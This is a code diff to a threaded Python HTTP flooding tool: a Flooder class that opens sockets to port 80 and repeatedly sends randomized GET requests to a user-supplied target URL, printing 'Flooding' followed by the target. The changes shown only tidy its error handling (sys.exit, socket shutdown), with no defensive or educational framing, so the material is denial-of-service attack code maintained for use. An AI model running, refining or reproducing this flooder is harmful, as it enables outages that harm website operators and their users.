@@ -24,8 +24,7 @@ class Flooder(threading.Thread):
         try:
             sock = socket.socket()
             if sock.connect_ex((ip, 80)) != 0:
-                sock.close()
-                exit()
+                raise Exception("Connect Error")
             sock.settimeout(30)
             sock.setblocking(0)
             while True:
@@ -47,8 +46,9 @@ class Flooder(threading.Thread):
                     sock.sendall(str.encode("GET "+randstr+target.path+" HTTP/1.1\r\nHost: "+target.netloc+"\r\n"+str(cur_header)+"\r\n\r\n\r\n"))
 
         except:
+            sock.shutdown(socket.SHUT_RDWR)
             sock.close()
-            exit()
+            sys.exit()
             pass
 
 
@@ -83,7 +83,7 @@ else:
 target = urllib.parse.urlparse(target)
 if target.netloc.__len__() == 0:
     print("Incorrect url input")
-    exit()
+    sys.exit()
 if str(target.path).__len__() == 0:
     str_target = target.scheme + "://" + target.netloc + target.path + "/"
     target = urllib.parse.urlparse(str_target)
@@ -96,7 +96,7 @@ try:
     print(ip)
 except:
     print("Can't get ip")
-    exit()
+    sys.exit()
 #  end IP getting
 
 print("Flooding %s" % str_target)
